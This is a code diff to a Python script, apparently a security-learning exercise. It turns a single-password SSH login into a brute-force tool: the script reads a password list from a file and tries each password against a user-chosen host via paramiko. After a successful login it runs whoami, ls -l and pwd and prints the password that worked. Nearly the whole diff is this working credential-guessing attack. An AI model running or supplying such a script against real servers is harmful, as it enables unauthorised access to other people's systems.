@@ -53,29 +53,42 @@ def password_recognized():
 def ssh_authentication():
     host = input("Provide IP address to SSH into: ")
     user = input("Please provide a username: ")
-    password = getpass("Input password: ")
+    password_list_filepath = input("Input the complete filepath for the password list: ")
     port = 22
-
+    #  create an object to handle SSH connection
     ssh = paramiko.SSHClient()
 
+    # Adding new host key to the local
+    # Host Keys object(incase of missing)
+    # AutoAddPolicy for missing host key to be set before connection setup.
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     try:
-        ssh.connect(host, port, user, password)
-        stdin, stdout, stderr = ssh.exec_command("whoami")
-        time.sleep(3)
-        output = stdout.read()
-        print(output)
-        stdin, stdout, stderr = ssh.exec_command("ls -l")
-        time.sleep(3)
-        output = stdout.read()
-        print(output)
-        stdin, stdout, stderr = ssh.exec_command("pwd")
-        time.sleep(3)
-        output = stdout.read()
-        print(output)
-    except paramiko.AuthenticationException:
-        print("Authentication Failed")
+        with open(password_list_filepath, 'r') as file:
+            passwords = [line.strip() for line in file]
+
+            for password in passwords:
+                try:
+                    ssh.connect(host, port, user, password)
+                    stdin, stdout, stderr = ssh.exec_command("whoami")
+                    time.sleep(3)
+                    output = stdout.read()
+                    print(output)
+                    stdin, stdout, stderr = ssh.exec_command("ls -l")
+                    time.sleep(3)
+                    output = stdout.read()
+                    print(output)
+                    stdin, stdout, stderr = ssh.exec_command("pwd")
+                    time.sleep(3)
+                    output = stdout.read()
+                    print(output)
+                    print("Successful login using password:", password)
+                    break  # Exit loop if successful login
+                except paramiko.AuthenticationException:
+                    print("Authentication failed using password:", password)
+
+    except FileNotFoundError:
+        print("File not found. Please check the filepath.")
 
 def main():
     print("Select a mode:")
